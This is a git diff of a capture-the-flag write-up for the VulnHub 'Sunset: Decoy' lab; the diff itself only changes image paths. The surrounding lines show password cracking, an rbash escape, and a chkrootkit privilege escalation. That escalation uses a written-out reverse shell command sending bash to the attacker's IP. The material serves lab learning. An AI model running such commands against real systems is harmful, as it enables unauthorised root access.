@@ -2,7 +2,7 @@
 
 Lets check the IP address first —>
 
-![Untitled](Sunset-Decoy/Untitled.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled.png)
 
 ```bash
 IP : 10.0.2.49
@@ -36,21 +36,21 @@ Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Web Enumeration ⤵️
 
-![Untitled](Sunset-Decoy/Untitled%201.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%201.png)
 
 Now lets brute force the password of zip file with `fcrackzip` tool ➡️
 
-![Untitled](Sunset-Decoy/Untitled%202.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%202.png)
 
 Got the password : `manuel`
 
 Now Lets see what I got →
 
-![Untitled](Sunset-Decoy/Untitled%203.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%203.png)
 
 Now lets decrypt the hash from shadow file with `hashcat` tool ➡️
 
-![Untitled](Sunset-Decoy/Untitled%204.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%204.png)
 
 Now I got the credentials of user → 
 
@@ -62,23 +62,23 @@ password : server
 
 Now let’s SSH into it ➡️
 
-![Untitled](Sunset-Decoy/Untitled%205.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%205.png)
 
 Since it is running rbash so I need to convert it to bash for that lets see what I got —>
 
-![Untitled](Sunset-Decoy/Untitled%206.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%206.png)
 
 Lets execute `honeypot.decoy` which have root privileges —>
 
-![Untitled](Sunset-Decoy/Untitled%207.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%207.png)
 
 Lets run Leave a note command with runs on vim I think so , which that I can change the shell ➡️
 
-![Untitled](Sunset-Decoy/Untitled%208.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%208.png)
 
 Now lets also set the PATH file —>
 
-![Untitled](Sunset-Decoy/Untitled%209.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%209.png)
 
 ```bash
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
@@ -89,25 +89,25 @@ Now lets also set the PATH file —>
 
 Now lets enumerate freely —>
 
-![Untitled](Sunset-Decoy/Untitled%2010.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2010.png)
 
 Lets check the logs file —>
 
-![Untitled](Sunset-Decoy/Untitled%2011.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2011.png)
 
 here I find extraction of `chkrootkit` which works as Antivirus purpose and wait I also found AV launch option in `honeypot.decoy` file so lets execute it →
 
-![Untitled](Sunset-Decoy/Untitled%2012.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2012.png)
 
 Now I see it is executing the chkrootkit as root Lets find an exploit related to it —>
 
-![Untitled](Sunset-Decoy/Untitled%2013.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2013.png)
 
 After reading it I got the steps to perform this exploitation →
 
-![Untitled](Sunset-Decoy/Untitled%2014.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2014.png)
 
-![Untitled](Sunset-Decoy/Untitled%2015.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2015.png)
 
 ```bash
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo "bash -c 'bash -i >& /dev/tcp/10.0.2.27/4444 0>&1'" > /tmp/update
@@ -117,7 +117,7 @@ After reading it I got the steps to perform this exploitation →
 
 Lets wait for cronjob to execute and wait for nc respomse →
 
-![Untitled](Sunset-Decoy/Untitled%2016.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2016.png)
 
 ```bash
 root@60832e9f188106ec5bcc4eb7709ce592:~# cat root.txt	
